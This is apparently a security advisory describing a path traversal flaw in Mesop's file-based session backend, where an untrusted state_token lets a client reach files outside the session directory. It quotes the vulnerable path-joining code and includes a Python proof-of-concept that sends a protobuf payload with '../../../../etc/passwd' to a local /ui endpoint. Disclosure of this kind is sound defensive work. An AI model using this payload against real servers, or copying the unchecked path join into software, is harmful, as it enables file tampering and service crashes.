summary: Mesop has a Path Traversal utilizing `FileStateSessionBackend` leads to Application
  Denial of Service and File Write/Deletion
details: "#### Summary\nA Path Traversal vulnerability allows any user (or attacker)
  supplying an untrusted `state_token` through the UI stream payload to arbitrarily
  target files on the disk under the standard file-based runtime backend. This can
  result in application denial of service (via crash loops when reading non-msgpack
  target files as configurations), or arbitrary file manipulation.\n\n#### Details\n
  When the framework is configured to use the disk-based session backend (`FileStateSessionBackend`),
  the user's `state_token` actively dictates where the runtime session state is physically
  saved or queried natively on disk. \nIn `mesop/server/server.py`, specifically the
  `ui_stream` endpoint, the `event.state_token` is collected directly from the untrusted
  incoming protobuf message struct: `mesop.protos.ui_pb2.UserEvent`.\nBecause this
  is unconditionally passed to `FileStateSessionBackend._make_file_path(self, token)`,
  it evaluates standard path operators (e.g. `../../../`). \n\n```python\n# mesop/server/state_session.py\n\
  \  def _make_file_path(self, token: str) -> Path:\n    return self.base_dir / (self.prefix
  + token)\n```\nPython's standard library natively resolves OS traversal semantics
  allowing full escape from the `base_dir` destination intent.\n\n#### PoC\nAn attacker
  can utilize Python to craft and send a malicious Protobuf payload to the `/ui` stream.\n
  \n```python\nimport requests\nimport mesop.protos.ui_pb2 as pb # Assuming mesop
  protos are compiled\n\n# 1. Craft the malicious protobuf message\nuser_event = pb.UserEvent()\n
  # Escaping the tmp directory via path traversal to target a sensitive file, e.g.,
  the root crontab or a system file\nuser_event.state_token = \"../../../../etc/passwd\"\
  \ \n\n# Alternatively, targeting Windows:\n# user_event.state_token = \"..\\\\..\\\
  \\..\\\\..\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\"\n\nserialized_event
  = user_event.SerializeToString()\n\n# 2. Send the message to the ui stream endpoint\n
  headers = {'Content-Type': 'application/x-protobuf'}\nresponse = requests.post(\n\
  \    \"http://localhost:32123/ui\",\n    data=serialized_event,\n    headers=headers\n
  )\n\n# The server will attempt to parse /etc/passwd using msgpack, \n# resulting
  in a crash or reading/overwriting operations depending on the request type invoked.\n
  print(response.content)\n```\n\n#### Impact\nThis vulnerability heavily exposes
  systems hosted utilizing `FileStateSessionBackend`. Unauthorized malicious actors
  could interact with arbitrary payloads overwriting or explicitly removing underlying
  service resources natively outside the application bounds."
